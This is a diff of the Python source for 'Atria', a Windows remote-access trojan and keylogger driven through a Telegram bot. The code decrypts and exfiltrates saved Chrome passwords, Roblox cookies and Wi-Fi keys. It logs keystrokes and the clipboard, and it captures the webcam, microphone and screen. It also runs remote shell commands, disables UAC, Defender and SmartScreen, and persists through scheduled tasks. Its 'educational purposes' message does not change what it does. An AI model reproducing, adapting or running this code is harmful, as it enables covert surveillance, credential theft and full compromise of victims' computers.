@@ -1,4 +1,3 @@
-# Standard library imports, built-in from Python
 import atexit
 import base64
 import ctypes
@@ -14,8 +13,6 @@ import threading
 import time
 import wave
 import winreg
-
-# Third-party library imports, run "Install Atria.bat" to install modules via pip
 import keyboard
 import psutil
 import cv2
@@ -28,133 +25,31 @@ import telebot
 import win32crypt
 import numpy as np
 import pygetwindow as gw
-
-# Specific imports from modules, run "Install Atria.bat" to install modules via pip
 from Cryptodome.Cipher import AES
-from PIL import Image
-from PyQt6 import QtWidgets
 from datetime import datetime, timedelta
-from functools import wraps
-from io import BytesIO
-from PyQt6.QtWidgets import QApplication, QLabel, QLineEdit, QMessageBox, QPushButton, QVBoxLayout, QWidget
 
-# Variables for the Python script
-IS_COMPILED = getattr(sys, 'frozen', False)
-BOT_TOKEN_FILE = 'bot_config.txt'
+bot_token_file = 'bot_config.txt'
 current_directory = os.getcwd()
 
-# Retry decorator with configurable attempts
-def retry_on_exception(exception_type, retries=3, delay=1):
-    def decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            for attempt in range(retries):
-                try:
-                    return func(*args, **kwargs)
-                except exception_type:
-                    if attempt < retries - 1:
-                        time.sleep(delay)
-            raise
-        return wrapper
-    return decorator
-
-# Initialize GUI for bot configuration
-class BotConfigGUI(QWidget):
-    def __init__(self):
-        super().__init__()
-        self.initUI()
-    
-    # UI setup for Atria configuration
-    def initUI(self):
-        self.setWindowTitle('Atria Configuration')
-        self.setGeometry(100, 100, 300, 200)
-
-        self.config = load_configuration()
-
-        self.token_label = QLabel('Bot Token:')
-        self.token_input = QLineEdit(self)
-        self.token_input.setText(self.config[0] if self.config[0] else '')
-        self.chat_id_label = QLabel('Chat ID:')
-        self.chat_id_input = QLineEdit(self)
-        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
-        self.save_button = QPushButton('Save Configuration', self)
-        self.compile_button = QPushButton('Compile Script', self)
-        self.save_button.clicked.connect(self.save_configuration)
-        self.compile_button.clicked.connect(self.compile_script)
-
-        layout = QVBoxLayout()
-        layout.addWidget(self.token_label)
-        layout.addWidget(self.token_input)
-        layout.addWidget(self.chat_id_label)
-        layout.addWidget(self.chat_id_input)
-        layout.addWidget(self.save_button)
-        layout.addWidget(self.compile_button)
-        self.setLayout(layout)
-
-    # Saves bot configuration and shows alerts
-    def save_configuration(self):
-        try:
-            bot_token = self.token_input.text()
-            chat_id = self.chat_id_input.text()
-
-            if bot_token and chat_id:
-                config_path = get_resource_path()
-                with open(config_path, 'w') as file:
-                    file.write(f"bot_token={bot_token}\n")
-                    file.write(f"chat_id={chat_id}\n")
-                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
-            else:
-                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
-        except Exception as e:
-            QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')
-
-    # Starts script compilation with alert
-    def compile_script(self):
-        try:
-            QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
-            self.close()
-
-            subprocess.Popen(
-                'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
-                shell=True
-            )
-        except Exception as e:
-            QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')
-
-# Get resource path based on execution mode
 def get_resource_path():
-    if IS_COMPILED:
-        return os.path.join(sys._MEIPASS, 'bot_config.txt')
-    else:
-        return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_config.txt')
-    
-# Validate the bot token format
-def is_valid_bot_token(token):
-    return ':' in token and len(token.split(':')) == 2
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, bot_token_file)
+    return os.path.join(os.path.dirname(os.path.abspath(__file__)), bot_token_file)
 
-# Load and validate config file
 def load_configuration():
     config_path = get_resource_path()
+    
     if not os.path.exists(config_path):
-        log_message("Configuration file not found. Creating default configuration.", 'warning')
-        with open(config_path, 'w') as file:
-            file.write("bot_token=\n")
-            file.write("chat_id=\n")
-        return '', ''
-    try:
-        with open(config_path, 'r') as file:
-            config = file.readlines()
-            if len(config) < 2:
-                return None, None
-            bot_token = config[0].strip().split('=')[1]
-            chat_id = config[1].strip().split('=')[1]
-            return bot_token, chat_id
-    except Exception as e:
-        log_message(f"Error loading configuration: {e}", 'error')
-        return '', ''
+        print("Configuration file not found.")
+        return None, None
 
-# Keylogger Main Functions
-# Append message to log file
+    with open(config_path, 'r') as file:
+        config = file.readlines()
+        bot_token = config[0].strip().split('=')[1]
+        chat_id = config[1].strip().split('=')[1]
+    
+    return bot_token, chat_id
+
 def log_message(message, log_type='keylog'):
     try:
         file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
@@ -163,37 +58,23 @@ def log_message(message, log_type='keylog'):
     except Exception as e:
         print(f"Error writing to log file: {e}")
 
-# Telegram Bot Variables
-# Initialize bot with configuration
 bot_token, chat_id = load_configuration()
-
-if not bot_token or not chat_id or not is_valid_bot_token(bot_token):
-    log_message("Invalid or missing bot token or chat ID. Opening GUI.", 'error')
-    
-    app = QApplication(sys.argv)
-    window = BotConfigGUI()
-    window.show()
-    sys.exit(app.exec())
-
 try:
     bot = telebot.TeleBot(bot_token)
 except Exception as e:
     log_message(f"Error initializing bot: {e}", 'error')
     bot = None
 
-# Send message using bot
 def send_message(message):
     if bot:
         bot.send_message(chat_id, message)
 
-# Send startup notifications
 def start_message():
     send_message("Monitoring started!")
     send_message("Thank you for using Atria!")
     send_message("Use this script only for educational purposes!")
     send_message("To list all commands, type /help in the chatbox.")
 
-# Provide command help information and send to Telegram Bot
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_message = (
@@ -228,7 +109,6 @@ def send_help(message):
     )
     bot.send_message(message.chat.id, help_message)
 
-# Capture and send screenshot to Telegram Bot
 @bot.message_handler(commands=['screenshot'])
 def send_photo(message):
     if bot:
@@ -246,13 +126,11 @@ def send_photo(message):
         except Exception as e:
             log_message(f"Error in send_photo: {e}", 'error')
 
-# Prompts user to send file
 @bot.message_handler(commands=['upload'])
 def upload_command(message):
     bot.send_message(message.chat.id, "Please send a file to upload (Max 20MB).")
     bot.register_next_step_handler(message, handle_document)
 
-# Handles file uploads
 def handle_document(message):
     if message.content_type == 'document':
         file_size = message.document.file_size
@@ -281,7 +159,6 @@ def handle_document(message):
     else:
         bot.reply_to(message, "Please send a valid document file.")
 
-# Handle file download request and send file to Telegram Bot
 @bot.message_handler(commands=['download'])
 def download_command(message):
     global current_directory
@@ -304,7 +181,6 @@ def download_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Download failed: {e}")
 
-# Execute shell commands and report results to Telegram Bot
 @bot.message_handler(commands=['shell'])
 def shell_command(message):
     global current_directory
@@ -347,7 +223,6 @@ def shell_command(message):
 
     bot.send_message(message.chat.id, output)
 
-# Retrieve and send user account information to Telegram Bot
 @bot.message_handler(commands=['users'])
 def users(message):
     try:
@@ -378,7 +253,6 @@ def users(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error occurred: {str(e)}')
 
-# Retrieve and send saved passwords from Chrome to Telegram Bot
 @bot.message_handler(commands=['passwords'])
 def send_passwords(message):
     bot.send_message(message.chat.id, "Retrieving passwords...")
@@ -406,7 +280,6 @@ def send_passwords(message):
         bot.send_message(message.chat.id, f"An unexpected error occurred: {str(e)}")
         log_message(f"Unexpected error: {e}", 'error')
 
-# Retrieve Chrome's encryption key
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
@@ -415,7 +288,6 @@ def get_encryption_key():
     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-# Decrypt Chrome's saved passwords
 def decrypt_password(password, key):
     try:
         iv = password[3:15]
@@ -428,11 +300,9 @@ def decrypt_password(password, key):
         except:
             return ""
 
-# Convert Chrome datetime format
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
-# Extract and decrypt Chrome passwords
 def retrieve_passwords(db_path, key):
     password_data = []
     
@@ -461,7 +331,6 @@ def retrieve_passwords(db_path, key):
     
     return password_data
 
-# Write and send password file
 def send_password_file(password_data, message):
     file_path = "passwords.txt"
     
@@ -482,7 +351,6 @@ def send_password_file(password_data, message):
     
     os.remove(file_path)
 
-# Records screen for specified duration
 @bot.message_handler(commands=['screenrecord'])
 def screen(message):
     try:
@@ -524,7 +392,6 @@ def screen(message):
         if os.path.exists(filename):
             os.remove(filename)
 
-# Hides the compiled Python script
 @bot.message_handler(commands=['hide'])
 def hide(message):
     try:
@@ -537,7 +404,6 @@ def hide(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Shutdowns user's pc
 @bot.message_handler(commands=['shutdown'])
 def shutdown_command(message):
     try:
@@ -546,7 +412,6 @@ def shutdown_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Restarts user's pc
 @bot.message_handler(commands=['restart'])
 def restart_command(message):
     try:
@@ -555,7 +420,6 @@ def restart_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Send tasklist and process descriptions
 @bot.message_handler(commands=['tasklist'])
 def command_execution(message):
     try:
@@ -585,7 +449,6 @@ def command_execution(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error:\n\n{e}")
 
-# Terminate a process by name or ID
 @bot.message_handler(commands=['taskkill'])
 def taskkill_command(message):
     try:
@@ -606,7 +469,6 @@ def taskkill_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error:\n\n{e}")
 
-# Record and send audio for specified seconds
 @bot.message_handler(commands=['mic'])
 def record_audio(message):
     default_record_time = 5
@@ -661,7 +523,6 @@ def record_audio(message):
 
     os.remove(WAVE_OUTPUT_FILENAME)
 
-# Capture and send a webcam photo
 @bot.message_handler(commands=['webscreenshot'])
 def take_photo(message):
     try:
@@ -683,12 +544,10 @@ def take_photo(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error capturing photo: {e}")
 
-# Retrieve data from IPinfo API endpoint
 def fetch_ip_info(endpoint):
     """Fetch IP info from a specified endpoint."""
     return os.popen(f'curl ipinfo.io/{endpoint}').read().strip()
 
-# Send system and IP information
 @bot.message_handler(commands=['info'])
 def information(message):
     try:
@@ -713,7 +572,6 @@ def information(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
-# Extract and filter useful system info
 def extract_useful_system_info(system_info):
     useful_keys = [
         "Caption", "OSArchitecture", "Version", "BuildNumber", "SerialNumber", 
@@ -731,7 +589,6 @@ def extract_useful_system_info(system_info):
 
     return "\n".join(useful_info)
 
-# Show current user name
 @bot.message_handler(commands=['whoami'])
 def whoami_command(message):
     try:
@@ -740,7 +597,6 @@ def whoami_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
-# Retrieve .ROBLOSECURITY cookie from various browsers
 def get_roblox_cookies():
     """Retrieve Roblox cookies from various browsers."""
     for browser in [browser_cookie3.chrome, browser_cookie3.brave, browser_cookie3.firefox,
@@ -754,7 +610,6 @@ def get_roblox_cookies():
             continue
     return None
 
-# Retrieve and send Roblox .ROBLOSECURITY cookie
 @bot.message_handler(commands=['robloxcookie'])
 def roblox(message):
     try:
@@ -776,7 +631,6 @@ def roblox(message):
         if os.path.exists('roblox_cookie.txt'):
             os.remove('roblox_cookie.txt')
 
-# Record webcam video, specify time
 @bot.message_handler(commands=['webcam'])
 def webcam_command(message):
     try:
@@ -794,7 +648,6 @@ def webcam_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Process camera index and record video
 def handle_camera_index(message, record_time):
     try:
         camera_index = int(message.text)
@@ -807,7 +660,6 @@ def handle_camera_index(message, record_time):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Record and send webcam video
 def record_video(message, camera_index, record_time):
     output_file = 'webcam_recording.mkv'
 
@@ -840,7 +692,6 @@ def record_video(message, camera_index, record_time):
         if os.path.exists(output_file):
             os.remove(output_file)
 
-# List available WiFi networks
 @bot.message_handler(commands=['wifilist'])
 def list_wifi_profiles(message):
     try:
@@ -849,7 +700,6 @@ def list_wifi_profiles(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Get WiFi password info
 @bot.message_handler(commands=['wifipass'])
 def get_wifi_password(message):
     try:
@@ -859,7 +709,6 @@ def get_wifi_password(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
-# Disable Task Manager
 @bot.message_handler(commands=['dtaskmgr'])
 def handle_disable_task_manager(message):
     try:
@@ -888,7 +737,6 @@ def handle_disable_task_manager(message):
 
     winreg.CloseKey(reg_key)
 
-# Disable Run command
 @bot.message_handler(commands=['drun'])
 def handle_disable_run_command(message):
     try:
@@ -917,7 +765,6 @@ def handle_disable_run_command(message):
 
     winreg.CloseKey(reg_key)
 
-# Disable Registry Tools
 @bot.message_handler(commands=['dregistry'])
 def handle_disable_registry_tools(message):
     try:
@@ -946,18 +793,16 @@ def handle_disable_registry_tools(message):
 
     winreg.CloseKey(reg_key)
 
-# Disable Windows Security Core Protections
 @bot.message_handler(commands=['dwinsec'])
 def handle_disable_windows_security(message):
     error_log_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security_errors.log')
     script_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security.ps1')
 
     powershell_script = f"""
-    $error.Clear()  # Clear any previous errors
+    $error.Clear()
     $errorLog = '{error_log_path}'
     
     try {{
-        # Disable Windows Defender settings
         Add-MpPreference -ExclusionExtension '*' 2>>$errorLog
         Set-MpPreference -EnableControlledFolderAccess Disabled 2>>$errorLog
         Set-MpPreference -PUAProtection disable 2>>$errorLog
@@ -970,7 +815,6 @@ def handle_disable_windows_security(message):
         Set-MpPreference -MAPSReporting 0 2>>$errorLog
         Set-MpPreference -SubmitSamplesConsent 2 2>>$errorLog
 
-        # Ensure registry paths exist and create them if necessary
         if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations')) {{
             New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Force
         }}
@@ -1036,7 +880,6 @@ def handle_disable_windows_security(message):
         if os.path.exists(error_log_path):
             os.remove(error_log_path)
 
-# Send keylogs to Telegram Bot
 @bot.message_handler(commands=['keylog'])
 def keylog(message):
     folder_path, log_files = get_app_dir()
@@ -1061,7 +904,6 @@ def keylog(message):
     else:
         bot.send_message(message.chat.id, "No keylog file found.")
 
-# Send clipboard logs to Telegram Bot
 @bot.message_handler(commands=['clipboard'])
 def dclipboard(message):
     folder_path, log_files = get_app_dir()
@@ -1086,8 +928,6 @@ def dclipboard(message):
     else:
         bot.send_message(message.chat.id, "No clipboard file found.")
 
-# Continuation of Keylogger Functions
-# Get path to Driver directory
 def get_app_dir():
     partitions = psutil.disk_partitions()
     drives = [p.mountpoint for p in partitions if p.device]
@@ -1111,7 +951,6 @@ def get_app_dir():
 
     return None, None
 
-# Create session files
 def create_session_files():
     folder_path, log_files = get_app_dir()
     if folder_path is None:
@@ -1124,14 +963,12 @@ def create_session_files():
         'clipboard': os.path.join(folder_path, f'clipboard_{timestamp}.txt')
     }
 
-# Log and clear current sentence
 def log_sentence():
     global sentence
     if sentence:
         log_message(f' - {sentence}')
         sentence = ''
 
-# Monitor and log active window title
 def monitor_active_window():
     previous_window = None
     while True:
@@ -1151,7 +988,6 @@ def monitor_active_window():
             log_message(f"Error in monitor_active_window: {e}", 'error')
         time.sleep(0.1)
 
-# Log and handle key press events
 def on_key_press(event):
     try:
         global sentence
@@ -1168,7 +1004,6 @@ def on_key_press(event):
     except Exception as e:
         log_message(f"Error in on_key_press: {e}", 'error')
 
-# Monitor and log clipboard changes
 def monitor_clipboard():
     global previous_clipboard_content
     try:
@@ -1183,7 +1018,6 @@ def monitor_clipboard():
         log_message(f"Error in monitor_clipboard: {e}", 'error')
         time.sleep(5)
 
-# Finalize and log session end
 def finalize_session(signum=None, frame=None):
     try:
         log_sentence()
@@ -1191,7 +1025,6 @@ def finalize_session(signum=None, frame=None):
     except Exception as e:
         log_message(f"Error in finalize_session: {e}", 'error')
 
-# Monitor and terminate specific processes
 def monitor_processes():
     while True:
         try:
@@ -1205,14 +1038,12 @@ def monitor_processes():
             log_message(f"Error in monitor_processes: {e}", 'error')
         time.sleep(0.1)
 
-# Check if running with admin privileges
 def run_as_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-# Disable UAC by modifying registry
 def disable_uac():
     script_path = None 
 
@@ -1256,7 +1087,6 @@ def disable_uac():
         if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
-# Disable UAC admin prompt by modifying registry
 def disable_uac_prompt():
     script_path = None
 
@@ -1300,7 +1130,6 @@ def disable_uac_prompt():
         if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
-# Suppress Defender Notifications by modifying registry
 def suppress_windows_defender_notifications():
     script_path = None
 
@@ -1344,7 +1173,6 @@ def suppress_windows_defender_notifications():
         if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
-# Disable Defender Real-Time Protection by modifying registry
 def disable_defender_realtime_protection():
     script_path = None
 
@@ -1388,7 +1216,6 @@ def disable_defender_realtime_protection():
         if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
-# Disable startup, stop and delete WinDefend
 def manage_windows_defender():
     check_service = subprocess.run(
         ["sc", "query", "WinDefend"],
@@ -1427,7 +1254,6 @@ def manage_windows_defender():
         except Exception as e:
             print(f"Unhandled exception while executing command {' '.join(command)}: {e}")
 
-# Change permission, kill and delete smartscreen
 def manage_smartscreen():
     try:
         powershell_script = """
@@ -1459,7 +1285,6 @@ def manage_smartscreen():
         if os.path.exists(script_path):
             os.remove(script_path)
 
-# Check if a scheduled task exists
 def task_exists(task_name):
     try:
         result = subprocess.run(f"schtasks /query /tn \"{task_name}\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -1468,7 +1293,6 @@ def task_exists(task_name):
         print(f"Error checking task existence: {e}")
         return False
 
-# Add application to startup using scheduled tasks
 def add_to_startup():
     try:
         app_path = sys.executable
@@ -1486,48 +1310,40 @@ def add_to_startup():
         print(f"Failed to add {task_name} to startup as a scheduled task: {e}")
 
 if __name__ == '__main__':
-    # Runs GUI if not compiled
-    if not IS_COMPILED:
-        app = QApplication(sys.argv)
-        window = BotConfigGUI()
-        window.show()
-        sys.exit(app.exec())
-    # Handles main functions when compiled
-    else:
-        if not run_as_admin():
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-            while not run_as_admin():
-                time.sleep(0.1)
+    if not run_as_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        while not run_as_admin():
+            time.sleep(0.1)
 
-        disable_uac()
-        disable_uac_prompt()
-        disable_defender_realtime_protection()
-        manage_windows_defender()
-        manage_smartscreen()
-        suppress_windows_defender_notifications()
-        add_to_startup()
+    disable_uac()
+    disable_uac_prompt()
+    disable_defender_realtime_protection()
+    manage_windows_defender()
+    manage_smartscreen()
+    suppress_windows_defender_notifications()
+    add_to_startup()
 
-        session_files = create_session_files()
-        sentence = ''
-        previous_clipboard_content = ''
+    session_files = create_session_files()
+    sentence = ''
+    previous_clipboard_content = ''
 
-        start_message()
-        threading.Thread(target=monitor_active_window, daemon=True).start()
-        threading.Thread(target=monitor_clipboard, daemon=True).start()
-        threading.Thread(target=monitor_processes, daemon=True).start()
-        keyboard.on_press(on_key_press)
-        signal.signal(signal.SIGINT, finalize_session)
-        atexit.register(finalize_session)
+    start_message()
+    threading.Thread(target=monitor_active_window, daemon=True).start()
+    threading.Thread(target=monitor_clipboard, daemon=True).start()
+    threading.Thread(target=monitor_processes, daemon=True).start()
+    keyboard.on_press(on_key_press)
+    signal.signal(signal.SIGINT, finalize_session)
+    atexit.register(finalize_session)
 
-        while True:
-            try:
-                bot.polling(none_stop=True, timeout=30)
-            except requests.exceptions.ReadTimeout:
-                log_message("Error: Bot polling timeout. Retrying...", 'error')
-                time.sleep(2)
-            except requests.exceptions.RequestException as e:
-                log_message(f"Error in bot polling: {e}", 'error')
-                time.sleep(2)
-            except Exception as e:
-                log_message(f"Unexpected error in bot polling: {e}", 'error')
-                time.sleep(2)
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=30)
+        except requests.exceptions.ReadTimeout:
+            log_message("Error: Bot polling timeout. Retrying...", 'error')
+            time.sleep(2)
+        except requests.exceptions.RequestException as e:
+            log_message(f"Error in bot polling: {e}", 'error')
+            time.sleep(2)
+        except Exception as e:
+            log_message(f"Unexpected error in bot polling: {e}", 'error')
+            time.sleep(2)
